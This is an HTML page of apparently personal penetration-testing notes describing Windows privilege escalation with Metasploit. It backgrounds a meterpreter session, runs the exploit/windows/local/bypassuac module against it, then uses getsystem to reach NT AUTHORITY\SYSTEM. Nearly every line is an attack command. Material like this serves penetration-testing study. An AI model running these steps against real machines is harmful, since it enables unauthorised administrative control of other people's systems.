<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>bypassuac (meterpreter)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>bypassuac (meterpreter)</h1><br/>We will use the module exploit/windows/local/bypassuac<br />Bypassing <span style="color:#00ff00;">User Account Control(UAC)</span><br /><br />To check if a UAC is enabled<br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;run&nbsp;post/windows/gather/win_privs</div></div><br /><br />we put in background the session where on the machine we have meterpreter shell but not Administrative permission<br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;background</div></div><br /><br />we search for the bypass user account control module and Administrative privilege<br /><div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;search&nbsp;uac</div></div><br />    <a href=""><img src="images/839-1.png" alt="images/839-1.png" /></a><br /><br /><div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/local/bypassuac</div></div><br /><br /><div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;show&nbsp;options</div></div><br /><div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;sessions<br />msf&nbsp;&gt;&nbsp;set&nbsp;SESSION&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#the&nbsp;one&nbsp;that&nbsp;we&nbsp;have&nbsp;put&nbsp;in&nbsp;background</div></div><br /><div class="codebox"><div class="codebox">msf&nbsp;&gt;&nbsp;run</div></div><br /><br />If the exploit succeed, we will obtain Administrator privileges on the machine, but not yet the highest privileges. <br />If the exploit succeed, we will obtain that the<span style="color:#00ff00;"> UAC</span> policy is disabled, so the <span style="color:#1e90ff;">getsystem</span> command works<br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;getsystem</div></div><br /><br />now we are NT Authority\System of the machine, which is the most privileged account on Windows, we can verify it with<br /><div class="codebox"><div class="codebox">meterpreter&nbsp;&gt;&nbsp;getuid</div></div><br /></div>
</body>
</html>
